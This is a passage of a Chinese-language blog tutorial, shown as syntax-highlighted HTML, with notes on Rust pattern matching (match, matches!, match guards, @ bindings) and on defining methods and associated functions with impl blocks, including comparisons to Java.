<span class=\"token type-definition class-name\">Coin</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">Penny</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Nickel</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Dime</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Quarter</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">value_in_cents</span><span class=\"token punctuation\">(</span>coin<span class=\"token punctuation\">:</span> <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token keyword\">u8</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">match</span> coin <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Penny</span> <span class=\"token operator\">=></span>  <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Lucky penny!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token number\">1</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Nickel</span> <span class=\"token operator\">=></span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Dime</span> <span class=\"token operator\">=></span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Quarter</span> <span class=\"token operator\">=></span> <span class=\"token number\">25</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// match是一个表达式，可以用来赋值</span>\n<span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">IpAddr</span> <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token class-name\">Ipv4</span><span class=\"token punctuation\">,</span>\n   <span class=\"token class-name\">Ipv6</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> ip1 <span class=\"token operator\">=</span> <span class=\"token class-name\">IpAddr</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Ipv6</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">let</span> ip_str <span class=\"token operator\">=</span> <span class=\"token keyword\">match</span> ip1 <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">IpAddr</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Ipv4</span> <span class=\"token operator\">=></span> <span class=\"token string\">\"127.0.0.1\"</span><span class=\"token punctuation\">,</span>\n        _ <span class=\"token operator\">=></span> <span class=\"token string\">\"::1\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;\"</span><span class=\"token punctuation\">,</span> ip_str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 模式绑定 （有点像解构）</span>\n<span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Coin</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">Penny</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Nickel</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Dime</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Quarter</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">UsState</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 25美分硬币</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">value_in_cents</span><span class=\"token punctuation\">(</span>coin<span class=\"token punctuation\">:</span> <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token keyword\">u8</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">match</span> coin <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Penny</span> <span class=\"token operator\">=></span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Nickel</span> <span class=\"token operator\">=></span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Dime</span> <span class=\"token operator\">=></span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span>\n        <span class=\"token comment\">// 这里可以通过这样的写法直接拿到state</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Quarter</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"State quarter from &#123;:?&#125;!\"</span><span class=\"token punctuation\">,</span> state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token number\">25</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 有时会遇到只有一个模式的值需要被处理，其它值直接忽略的场景，如果用 match 来处理就要写成下面这样</span>\n<span class=\"token keyword\">let</span> v <span class=\"token operator\">=</span> <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token number\">3u8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">match</span> v <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"three\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n   _ <span class=\"token operator\">=></span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 这种情况下可以直接用语法糖简化</span>\n<span class=\"token keyword\">if</span> <span class=\"token keyword\">let</span> <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> v <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"three\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>match的匹配必须穷尽所有的情况，也就是如果不列出所有的可能，必须定义_ &#x3D;&gt;分支</p>\n</blockquote>\n<h3 id=\"matches-宏\"><a href=\"#matches-宏\" class=\"headerlink\" title=\"matches!宏\"></a>matches!宏</h3><blockquote>\n<p>跟java中的String#matches比较类似，如果我只是想知道某个实例是否匹配上了我给与的模式，可以不用特意去macth,直接调用matches!宏。</p>\n</blockquote>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token comment\">// 使用match</span>\n<span class=\"token keyword\">let</span> foo <span class=\"token operator\">=</span> <span class=\"token char string\">'f'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> matched <span class=\"token operator\">=</span> <span class=\"token keyword\">match</span> foo <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token char string\">'A'</span><span class=\"token punctuation\">..</span><span class=\"token char string\">'Z'</span> <span class=\"token operator\">|</span> <span class=\"token char string\">'a'</span><span class=\"token punctuation\">..</span><span class=\"token char string\">'z'</span> <span class=\"token operator\">=></span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n    _ <span class=\"token operator\">=></span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 使用matches!</span>\n<span class=\"token keyword\">let</span> foo <span class=\"token operator\">=</span> <span class=\"token char string\">'f'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> matched <span class=\"token operator\">=</span> <span class=\"token macro property\">matches!</span><span class=\"token punctuation\">(</span>foo<span class=\"token punctuation\">,</span> <span class=\"token char string\">'A'</span><span class=\"token punctuation\">..</span><span class=\"token char string\">'Z'</span> <span class=\"token operator\">|</span> <span class=\"token char string\">'a'</span><span class=\"token punctuation\">..</span><span class=\"token char string\">'z'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"解构\"><a href=\"#解构\" class=\"headerlink\" title=\"解构\"></a>解构</h3><p>解构其实也是模式匹配实现的，在上一节笔记中已经写过了，不做详细介绍</p>\n<h3 id=\"匹配守卫\"><a href=\"#匹配守卫\" class=\"headerlink\" title=\"匹配守卫\"></a>匹配守卫</h3><blockquote>\n<p>在要匹配的模式后面可以加上if condition，来对模式匹配进行进一步限制</p>\n</blockquote>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">let</span> y <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">match</span> x <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Got 50\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> n <span class=\"token operator\">==</span> y <span class=\"token operator\">=></span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Matched, n = &#123;&#125;\"</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        _ <span class=\"token operator\">=></span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Default case, x = &#123;:?&#125;\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"at the end: x = &#123;:?&#125;, y = &#123;&#125;\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p><strong>匹配守卫的条件会作用于所有的模式</strong></p>\n</blockquote>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> y <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">match</span> x <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">4</span> <span class=\"token operator\">|</span> <span class=\"token number\">5</span> <span class=\"token operator\">|</span> <span class=\"token number\">6</span> <span class=\"token keyword\">if</span> y <span class=\"token operator\">=></span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yes\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    _ <span class=\"token operator\">=></span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"no\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>这个例子中看起来好像 <code>if y</code> 只作用于 <code>6</code>，但实际上匹配守卫 <code>if y</code> 作用于 <code>4</code>、<code>5</code> <strong>和</strong> <code>6</code> ，在满足 <code>x</code> 属于 <code>4 | 5 | 6</code> 后才会判断 <code>y</code> 是否为 <code>true</code>：</p>\n</blockquote>\n<h3 id=\"绑定\"><a href=\"#绑定\" class=\"headerlink\" title=\"@绑定\"></a>@绑定</h3><blockquote>\n<p>说白了就是我们即想要模式匹配，匹配成功后又想通过解构的形式拿到对应的值</p>\n<p>小孩子才做选择 大人全都要！</p>\n</blockquote>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Message</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">&#123;</span> id<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">let</span> msg <span class=\"token operator\">=</span> <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">&#123;</span> id<span class=\"token punctuation\">:</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">match</span> msg <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">&#123;</span> id<span class=\"token punctuation\">:</span> id_variable <span class=\"token operator\">@</span> <span class=\"token number\">3</span><span class=\"token punctuation\">..=</span><span class=\"token number\">7</span> <span class=\"token punctuation\">&#125;</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Found an id in range: &#123;&#125;\"</span><span class=\"token punctuation\">,</span> id_variable<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">&#123;</span> id<span class=\"token punctuation\">:</span> <span class=\"token number\">10</span><span class=\"token punctuation\">..=</span><span class=\"token number\">12</span> <span class=\"token punctuation\">&#125;</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Found an id in another range\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">&#123;</span> id <span class=\"token punctuation\">&#125;</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Found some other id: &#123;&#125;\"</span><span class=\"token punctuation\">,</span> id<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>上面这个例子的第一个分支中，我们既通过解构拿到了id，又对他进行了模式匹配: 在3..&#x3D;7范围内才能通过。</p>\n<p>注意:</p>\n<blockquote>\n<p>考虑下面一段代码:</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">match</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">&#123;</span>\n        num <span class=\"token operator\">@</span> <span class=\"token number\">1</span> <span class=\"token operator\">|</span> <span class=\"token number\">2</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;\"</span><span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        _ <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>编译不通过，是因为 <code>num</code> 没有绑定到所有的模式上，只绑定了模式 <code>1</code>，你可能会试图通过这个方式来解决：</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\">num <span class=\"token operator\">@</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">|</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>但是，如果你用的是 Rust 1.53 之前的版本，那这种写法会报错，因为编译器不支持。</p>\n</blockquote>\n<h2 id=\"方法\"><a href=\"#方法\" class=\"headerlink\" title=\"方法\"></a>方法</h2><p>Rust使用<code>impl</code>块来定义方法，多说无益，先来一段示例代码</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n    x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// new是Circle的关联函数，因为它的第一个参数不是self</span>\n    <span class=\"token comment\">// 这种方法往往用于初始化当前结构体的实例</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">new</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n            x<span class=\"token punctuation\">:</span> x<span class=\"token punctuation\">,</span>\n            y<span class=\"token punctuation\">:</span> y<span class=\"token punctuation\">,</span>\n            radius<span class=\"token punctuation\">:</span> radius<span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Circle的方法，&amp;self表示借用当前的Circle结构体</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">area</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token keyword\">f64</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token namespace\">std<span class=\"token punctuation\">::</span></span><span class=\"token keyword\">f64</span><span class=\"token punctuation\">::</span><span class=\"token namespace\">consts<span class=\"token punctuation\">::</span></span><span class=\"token constant\">PI</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius <span class=\"token operator\">*</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>与java的不同在于，要实现一个类似于java类的结构，我们需要定义struct和它的impl，相当于字段的声明和方法的声明被分开了。</p>\n<p>并且，impl可以有很多个</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n    x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">new</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n            x<span class=\"token punctuation\">:</span> x<span class=\"token punctuation\">,</span>\n            y<span class=\"token punctuation\">:</span> y<span class=\"token punctuation\">,</span>\n            radius<span class=\"token punctuation\">:</span> radius<span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">area</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token keyword\">f64</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token namespace\">std<span class=\"token punctuation\">::</span></span><span class=\"token keyword\">f64</span><span class=\"token punctuation\">::</span><span class=\"token namespace\">consts<span class=\"token punctuation\">::</span></span><span class=\"token constant\">PI</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius <span class=\"token operator\">*</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这样做的好处在于可以让方法的声明更加清晰，我们可以把为完成同一种职能的方法声明在一个impl块中，这样比起塞在一块会有条理得多。</p>\n<h3 id=\"关联函数-amp-方法\"><a href=\"#关联函数-amp-方法\" class=\"headerlink\" title=\"关联函数&amp;方法\"></a>关联函数&amp;方法</h3><p>看到<code>函数</code>和<code>方法</code>二字我们便可以知晓他们的不同。函数不会绑定在一个对象上，而方法会。</p>\n<p>我们先来看一下如何声明关联函数与方法</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n    x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// new是Circle的关联函数，因为它的第一个参数不是self</span>\n    <span class=\"token comment\">// 这种方法往往用于初始化当前结构体的实例</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">new</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n            x<span class=\"token punctuation\">:</span> x<span class=\"token punctuation\">,</span>\n            y<span class=\"token punctuation\">:</span> y<span class=\"token punctuation\">,</span>\n            radius<span class=\"token punctuation\">:</span> radius<span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Circle的方法，&amp;self表示借用当前的Circle结构体</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">area</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token keyword\">f64</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token namespace\">std<span class=\"token punctuation\">::</span></span><span class=\"token keyword\">f64</span><span class=\"token punctuation\">::</span><span class=\"token namespace\">consts<span class=\"token punctuation\">::</span></span><span class=\"token constant\">PI</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius <span class=\"token operator\">*</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看到，所谓的方法，就是传入了一个<code>&amp;self</code>的函数，这是一个语法糖，实际上是 <code>self: &amp;Self</code> 